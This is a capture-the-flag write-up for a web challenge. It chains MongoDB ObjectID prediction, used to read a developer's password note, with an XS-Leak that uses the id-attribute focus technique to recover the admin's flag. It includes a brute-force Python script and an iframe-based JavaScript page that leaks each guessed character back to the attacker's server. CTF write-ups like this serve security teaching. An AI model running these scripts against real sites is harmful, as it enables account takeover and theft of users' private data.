# todo

TLDR;

Mongo ObjectID predict exploit + XS LEAK using the ID attribute technique (https://xsleaks.dev/docs/attacks/id-attribute/)

# Mongo ObjectID predict


First goal is to bypass the login. When going to /api/notes it will show "_id", the structure of the ID should hint toward the mongodb predict exploit which would allow us leak the dev's note with his password.

However we wont be able to leak the admin's note since it is manually changed to a long hex char:

```js

// init.js 

const secret_id = crypto.randomBytes(64).toString("hex");
const todo = db.getSiblingDB('todo');

todo.users.insertOne({ username: "admin@spark.tech", password: process.env.ADMIN_PASSWORD });
todo.users.insertOne({ username: "dev@spark.tech", password: process.env.DEV_PASSWORD });


FLAG = process.env.FLAG

todo.notes.insertOne(
    {
        _id: secret_id,
        title: "flag",
        owner: "admin@spark.tech",
        content: FLAG,
        protected: 1
    });

```

# XS-Leak: ID Attribute

The next part is how can we leak the admin's flag?

Well, we have a search functionality and we can notice that once a note was found in `/api/search` it will be put it inside an input with an id attribute `id=note`

```html
<div class="box">
    <div class="w-1/2">
        <h1>Found!</h1>
        <h1>Edit:</h2>
		<!-- TODO: implement edit functionality in /api/search -->
            <input id="note" value="placeholder note">
	</div>
</div>
            
```

Luckily the input tag is focusable! which means we can do something like `http://localhost:3000/search?input=Spark#note` which would allow us to ***focus*** on the element with id="note".

***Note that this is only possible because it is a focusable element!
(read more about this technique here: https://xsleaks.dev/docs/attacks/id-attribute/)***

With this we can try different chars to get the flag! easy.

however we still dont have the admin account and the `/api/search` endpoint is only accessible by the admin but since this website doesnt include any framing protection headers we can iframe it and send it the admin to do the searching for us.

# Solution

```python
import requests
from mongo_objectid_predict import predict

id = input("id: ")
chall = "http://localhost:3000"

for objectid in predict(id):
    response = requests.get(chall+'/note/%s' % objectid)
    if "password" in response.text:
        print(objectid)

```

```html

<html>
<body>
  <script>
    
    const sleep = (ms) => {
      return new Promise(resolve => setTimeout(resolve, ms));
    }

    var flag = "SparkCTF{"
    async function leak() {
      while (true) {
        for (let c of "abcdefghijklmnopqrstuvwxyz012345789_{}") {
        
          // create iframe and reset found status
          let ifr = document.createElement('iframe');
          fetch("/?c=" + flag + c)
          found = false;
          
          await sleep(1000)
          
          // note found
          document.body.onblur = async () => {
            flag += c
            fetch("/?leaked=" + flag)
            console.log("Found!: " + flag)
            found = true
            // reset onblur
            document.body.onblur = ''
            await sleep(1000)
            ifr.remove()
          }
          
          // note not found
          // waiting 1500 ms so chrome doesnt crash 
          setTimeout(() => {
            document.body.onblur = ''
            ifr.remove()
          }, 1500)

          console.log("Trying: ", "http://127.0.0.1:3000/api/search?input=" + encodeURIComponent(flag + c) + "#note")

          ifr.src = "http://127.0.0.1:3000/api/search?input=" + encodeURIComponent(flag + c) + "#note";
          document.body.appendChild(ifr);
          
          // if note found just skip to next char
          if (found) {
            console.log(window.onblur)
            ifr.remove()
            break;
          }
        }
      }
    }

    leak()
  </script>
</body>
<html>


```